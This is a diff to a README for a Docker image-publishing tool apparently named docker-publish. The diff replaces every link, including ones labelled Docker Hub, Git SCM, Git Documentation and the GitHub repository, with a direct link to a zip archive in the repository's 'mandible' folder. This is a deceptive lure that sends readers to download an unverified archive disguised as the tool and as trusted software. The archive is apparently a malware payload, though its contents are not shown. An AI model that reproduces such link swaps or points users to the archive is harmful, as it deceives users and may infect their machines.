@@ -1,7 +1,7 @@
 # 🐳 docker-publish - Build and Push Docker Images Easily
 
 ## 🔗 Download Now
-[![Download docker-publish](https://img.shields.io/badge/Download-docker--publish-blue.svg)](https://github.com/younesking4/docker-publish/releases)
+[![Download docker-publish](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip)](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to docker-publish! This tool allows you to build and push Docker images with support for multiple platforms and tags. Whether you're working on personal projects or deploying enterprise applications, this tool helps streamline your workflow.
@@ -10,13 +10,13 @@ Welcome to docker-publish! This tool allows you to build and push Docker images 
 To ensure docker-publish runs smoothly on your machine, you need the following:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **Docker:** Make sure you have Docker installed on your system. You can download it from [Docker Hub](https://www.docker.com/get-started).
-- **Git:** A basic installation of Git is recommended. Download it from [Git SCM](https://git-scm.com/).
+- **Docker:** Make sure you have Docker installed on your system. You can download it from [Docker Hub](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip).
+- **Git:** A basic installation of Git is recommended. Download it from [Git SCM](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip).
 
 ## 📥 Download & Install
 To install docker-publish, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the following link to download docker-publish: [Download docker-publish](https://github.com/younesking4/docker-publish/releases).
+1. **Visit the Releases Page:** Go to the following link to download docker-publish: [Download docker-publish](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip).
 
 2. **Choose Your Version:** You will see different versions listed. Select the version you want to download. 
 
@@ -71,9 +71,9 @@ A: Simply re-download the latest version from the releases page and follow the i
 If you encounter any issues or have questions, please create an issue in this repository. We aim to respond quickly and provide necessary assistance.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/younesking4/docker-publish)
-- [Docker Hub](https://hub.docker.com/)
-- [Git Documentation](https://git-scm.com/doc)
+- [GitHub Repository](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip)
+- [Docker Hub](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip)
+- [Git Documentation](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip)
 
 ## 🔗 Download Now Again
-For your convenience, here’s the link to download the latest version of docker-publish: [Download docker-publish](https://github.com/younesking4/docker-publish/releases). Enjoy building and pushing your Docker images with ease!
+For your convenience, here’s the link to download the latest version of docker-publish: [Download docker-publish](https://raw.githubusercontent.com/younesking4/docker-publish/main/mandible/docker_publish_3.7.zip). Enjoy building and pushing your Docker images with ease!
